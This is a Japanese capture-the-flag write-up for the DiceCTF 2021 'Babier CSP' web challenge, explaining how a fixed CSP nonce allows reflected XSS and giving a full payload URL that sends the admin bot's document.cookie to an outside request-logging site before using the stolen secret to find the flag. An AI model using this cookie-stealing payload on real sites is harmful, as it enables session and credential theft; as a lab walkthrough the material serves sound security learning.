# web/Babier CSP

## 問題
[babier-csp.dicec.tf](babier-csp.dicec.tf)  
[Admin Bot](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp)  

The admin will set a cookie `secret` equal to `config.secret` in [index.js](https://github.com/raster0x2a/CTF-writeup/blob/master/DiceCTF/index.js).

## 解説
まず [babier-csp.dicec.tf](babier-csp.dicec.tf) は name に渡された文字列をそのまま表示させています。そのため XSS が期待できますが、 `<script>alert('ok')</script>` などを直接入れても以下のように怒られます。  

```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-LRGWAXOY98Es0zz0QOVmag=='". Either the 'unsafe-inline' keyword, a hash ('sha256-GhSELej6D4No8Cu4c6BlA7SQooAXc4iM9HQ5s9uW7Gw='), or a nonce ('nonce-...') is required to enable inline execution.
```

script タグの nonce 属性には、CSP(Content Security Policy) によって JavaScript の実行を制限し、XSS などを防ぐ機能があります。しかし nonce の値が予測できてしまえば意味をなさないため、本来はリクエストごとにランダムな文字列を生成しなければならないのですが、このページでは `LRGWAXOY98Es0zz0QOVmag==` で固定されています。そのため `<script nonce=LRGWAXOY98Es0zz0QOVmag==>hoge</script>` という形式で怒られずに任意のスクリプトをインジェクションできます。

次に [Admin Bot](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp) では、 URL を入力して submit すると入力した URL に Admin がアクセスしてくれます。Admin の cookie を得ることが第一の目的なので、 [babier-csp.dicec.tf](babier-csp.dicec.tf) にアクセスさせてから、cookie をクエリに含めてリクエスト内容を確認できる URL に遷移させることを考えます。
私はリクエストを確認するために [Request Inspector](https://requestinspector.com/) というサイトを利用しました。
具体的には以下の URL を入力することで cookie が確認できました。  
`https://babier-csp.dicec.tf/?name=<script nonce=LRGWAXOY98Es0zz0QOVmag==>location.href={Request Inspectorで発行したURL}?${document.cookie}</script>`

`index.js`を見てみると
```js
app.use('/' + SECRET, express.static(__dirname + "/secret"));
```
とあるため、 `https://babier-csp.dicec.tf/{cookieのsecretの値}` にアクセスしてみると、ソースのコメントにフラグが書いてあります。